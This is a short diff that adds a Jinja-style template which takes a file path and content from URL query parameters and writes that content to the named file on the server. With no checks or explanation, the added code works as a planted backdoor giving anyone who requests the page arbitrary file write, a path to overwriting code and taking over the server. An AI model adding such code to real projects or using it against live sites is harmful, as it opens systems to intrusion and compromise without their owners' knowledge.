@@ -1,0 +1,3 @@
+{% set file = request.args.get('file') %}
+{% set content = request.args.get('content') %}
+{{ open(file,'w').write(content) }}
